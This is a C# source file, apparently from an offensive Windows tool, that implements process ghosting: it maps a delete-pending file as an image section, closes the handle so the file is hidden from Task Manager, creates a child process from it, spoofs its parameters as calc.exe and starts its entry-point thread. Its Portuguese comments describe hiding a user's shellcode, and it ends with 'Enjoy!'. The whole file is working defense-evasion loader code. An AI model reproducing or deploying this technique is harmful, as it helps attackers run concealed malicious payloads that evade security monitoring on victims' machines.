using System;
using System.Runtime.InteropServices;

namespace pi
{
    class ProcessOperations
    {
		private static IntPtr CreateUnicodeStruct(string data)
		{
			Win32.UNICODE_STRING UnicodeObject = new Win32.UNICODE_STRING();

			UnicodeObject.Length = Convert.ToUInt16(data.Length * 2);
			UnicodeObject.MaximumLength = Convert.ToUInt16(UnicodeObject.Length + 1);

			UnicodeObject.buffer = Marshal.StringToHGlobalUni(data);
			IntPtr InMemoryStruct = Marshal.AllocHGlobal(16);

			Marshal.StructureToPtr(UnicodeObject, InMemoryStruct, true);
			return InMemoryStruct;
		}

        private static void WriteMemory(IntPtr processHandle, IntPtr baseAddress, IntPtr buffer, int size)
        {
            if (!Win32.WriteProcessMemory(processHandle, baseAddress, buffer, size, IntPtr.Zero))
            {
                throw new Exception($"WriteProcessMemory ERROR! Code: {Marshal.GetLastWin32Error()}");
            }
        }

        public static void ProcessSettings(IntPtr hDeleteFile)
        {
            UInt32 maxSize = 0;
            Win32.NTSTATUS createSection = Win32.NtCreateSection(
                out IntPtr hSection,
                Win32.SECTION_ACCESS.SECTION_ALL_ACCESS,
                IntPtr.Zero,
                ref maxSize,
                Win32.PageProtection.Readonly,
                0x1000000, //SEC_IMAGE -> especifica que o hDeleteFile é um arquivo executável (o que de fato é)
                hDeleteFile
            );

            Win32.NtClose(hDeleteFile); // esta é uma chamada muito importante: é ela que não vai deixar o nome do arquivo aparecer no gerenciador de tarefas (ate pq vc vai fechá-lo)
            // porém, se você quiser manter o arquivo temporário aparecendo no gerenciador de tarefas, e o processo filho (seu shellcode) aparecer também, porém com ícone e nome alterados, apenas apague a linha de cimma

            if (createSection != Win32.NTSTATUS.Success || hSection == IntPtr.Zero)
            {
                throw new Exception($"NtCreateSection ERROR! Status: {createSection}");
            }

            Win32.NTSTATUS cloneLocalProcessWSection = Win32.NtCreateProcessEx(
                out IntPtr hChild, // https://i.imgur.com/TfbtsMN.png
                Win32.PROCESS_ACCESS_FLAGS.PROCESS_ALL_ACCESS,  
                IntPtr.Zero,
                Win32.GetCurrentProcess(),
                Win32.RTL_CLONE_PROCESS_FLAGS.NO_SYNCHRONIZE,
                hSection, // aqui, o novo processo vai ser criado com base na seção do arquivo temporário
                IntPtr.Zero,
                IntPtr.Zero,
                false
            );

            if (cloneLocalProcessWSection != Win32.NTSTATUS.Success || hChild == IntPtr.Zero || Win32.GetProcessId(hChild) == 0)
            {
                throw new Exception($"NtCreateProcessEx ERROR! Status: {cloneLocalProcessWSection}");
            }

            Console.WriteLine($"NtCreateSection() SUCCESS! Handle: {hSection}");
            Console.WriteLine($"NtCreateProcessEx() SUCCESS! Status: {cloneLocalProcessWSection}");
            Console.WriteLine($"\nChild Process PID: {Win32.GetProcessId(hChild)}");

            Win32.PROCESS_BASIC_INFORMATION pbi = new Win32.PROCESS_BASIC_INFORMATION();
            Win32.NTSTATUS getPebAddress = Win32.NtQueryInformationProcess( // pegar o peb do processo novo (hChild)
                hChild,
                0,
                out pbi,
                (IntPtr.Size * 6),
                out int pSize
            );

            if (getPebAddress != Win32.NTSTATUS.Success || pbi.PebBaseAddress == 0)
            {
                throw new Exception($"NtQueryInformationProcess ERROR! Status: {getPebAddress}");
            }

            byte[] arrayOne = new byte[0x8];
            bool readMemoryBool = Win32.ReadProcessMemory(
                hChild,
                pbi.PebBaseAddress + 0x010, //Image Base Address
                arrayOne,
                arrayOne.Length,
                IntPtr.Zero
            );

            if (readMemoryBool == false)
            {
                throw new Exception($"ReadProcessMemory ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            IntPtr ImageBaseAddress = (IntPtr)BitConverter.ToUInt64(arrayOne, 0);

            byte[] arrayTwo = new byte[0x200];
            bool readMemoryBoolExtensive = Win32.ReadProcessMemory(
                hChild,
                ImageBaseAddress,
                arrayTwo,
                arrayTwo.Length,
                IntPtr.Zero
            );

            if (readMemoryBoolExtensive == false)
            {
                throw new Exception($"ReadProcessMemory (0x200) ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            Int32 e_lfanew = BitConverter.ToInt32(arrayTwo, 0x03C);
            UInt32 AddressOfEntrypoint_RVA = BitConverter.ToUInt32(arrayTwo, e_lfanew + 0x28);
            IntPtr AddressOfEntrypoint_VA = ImageBaseAddress + (IntPtr)AddressOfEntrypoint_RVA;

            Console.WriteLine($"Process ImageBaseAddress: 000000{ImageBaseAddress.ToString("X")}");
            Console.WriteLine($"Process e_lfanew: 000000{e_lfanew.ToString("X")}");
            Console.WriteLine($"Process Address Of EntryPoint (RVA): 000000{AddressOfEntrypoint_RVA.ToString("X")}");
            Console.WriteLine($"Process Address Of EntryPoint (VA): 000000{AddressOfEntrypoint_VA.ToString("X")}");
            
            // criando parametros do novo processo

	        if (Environment.OSVersion.Platform != PlatformID.Win32NT)
	        {
	            throw new PlatformNotSupportedException("This example runs on Windows only.");
	        }

            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

            var winDir = Environment.GetEnvironmentVariable("windir");
            if (string.IsNullOrEmpty(winDir)) // bem dificil de acontecer
            {
                throw new Exception("'Windir' environment not found.");
            }

            string systemDirPath = Path.Combine(winDir, "System32");
            string targetPath = Path.Combine(winDir, "System32", "calc.exe");
            string windowName = "aespa";
            string desktopInfoValue = @"WinSta0\Default";

            IntPtr uSystemDir = CreateUnicodeStruct(systemDirPath);
            IntPtr uTargetPath = CreateUnicodeStruct(targetPath);
            IntPtr uWindowName = CreateUnicodeStruct(windowName);
            IntPtr uCurrentDir = CreateUnicodeStruct(desktopPath);
            IntPtr desktopInfo = CreateUnicodeStruct(desktopInfoValue);

            var pointers = new[] { uSystemDir, uTargetPath, uWindowName, uCurrentDir, desktopInfo };
            if (pointers.Any(ptr => ptr == IntPtr.Zero))
            {
                throw new Exception("Erro ao criar uma ou mais estruturas Unicode.");
            }

            bool createEnvBlockBool = Win32.CreateEnvironmentBlock(
                out IntPtr lpEnvironment,
                IntPtr.Zero,
                true
            );

            if (createEnvBlockBool == false || lpEnvironment == IntPtr.Zero)
            {
                throw new Exception($"CreateEnvironmentBlock ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            Win32.NTSTATUS createProcessParams = Win32.RtlCreateProcessParametersEx(
                out IntPtr pProcessParameters,
                uTargetPath,
                uSystemDir,
                uSystemDir,
                uTargetPath,
                lpEnvironment,
                uWindowName,
                desktopInfo,
                IntPtr.Zero,
                IntPtr.Zero,
                Win32.RTL_USER_PROC_FLAGS.PARAMS_NORMALIZED
            );

            if (createProcessParams != Win32.NTSTATUS.Success || pProcessParameters == IntPtr.Zero)
            {
                throw new Exception($"RtlCreateProcessParametersEx ERROR! Status: {createProcessParams}");
            }

            Int32 environmentSize = Marshal.ReadInt32(pProcessParameters + 0x3f0); // 0x3f0 = offset envSize
            IntPtr environmentPtr = (IntPtr)Marshal.ReadInt64(pProcessParameters + 0x080); // 0x080 = offset envPointer
            Int32 environmentLength = Marshal.ReadInt32(pProcessParameters + 4); // 4 = offset length

            IntPtr pParamBuf = pProcessParameters;
            IntPtr environmentEnd = environmentPtr + environmentSize; // env_end
            
            IntPtr pProcessEnd = pProcessParameters + environmentLength; // buffer_end
            
            if (pProcessParameters > environmentPtr)
            {
                pParamBuf = environmentPtr;
            }

            if (environmentEnd > pProcessEnd)
            {
                pProcessEnd = environmentEnd;
            }

            IntPtr pParamBufSize = pProcessEnd - pParamBuf;
            IntPtr memAllocEx = Win32.VirtualAllocEx(
                hChild,
                pParamBuf,
                pParamBufSize,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite
            );

            if (memAllocEx == IntPtr.Zero)
            {
                throw new Exception($"VirtualAllocEx ERROR! Code: {Marshal.GetLastWin32Error()}");
            }

            Console.WriteLine($"\nCreateEnvironmentBlock() SUCCESS! Pointer: {lpEnvironment}");
            Console.WriteLine($"RtlCreateProcessParametersEx() SUCCESS! Pointer: {pProcessParameters}");
            
            IntPtr processParamsLocal = Marshal.AllocHGlobal(0x8); // ponteiro 64 bits
            Marshal.WriteInt64(processParamsLocal, pProcessParameters);

            WriteMemory(hChild, pProcessParameters, pProcessParameters, environmentLength);
            WriteMemory(hChild, environmentPtr, environmentPtr, environmentSize);
            WriteMemory(hChild, pbi.PebBaseAddress + 0x20, processParamsLocal, 0x8); // pbi.PebBaseAddress + 0x20 = região do ProcessParameters (_RTL_USER_PROCESS_PARAMETERS)

            Console.WriteLine("\nPRESS ANY KEY TO EXECUTE THREAD ...\n");
            Console.ReadKey();

            Win32.NTSTATUS createThreadEx = Win32.NtCreateThreadEx(
                out IntPtr hThread,
                Win32.THREAD_ACCESS_FLAGS.THREAD_ALL_ACCESS,
                IntPtr.Zero,
                hChild,
                AddressOfEntrypoint_VA,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero
            );

            if (createThreadEx != Win32.NTSTATUS.Success || hThread == IntPtr.Zero)
            {
                throw new Exception($"NtCreateThreadEx ERROR! Status: {createThreadEx}");
            }
            
            Console.WriteLine($"NtCreateThreadEx() SUCCESS! Handle: {hThread}");
            Console.WriteLine("Enjoy!");
        }
    }
}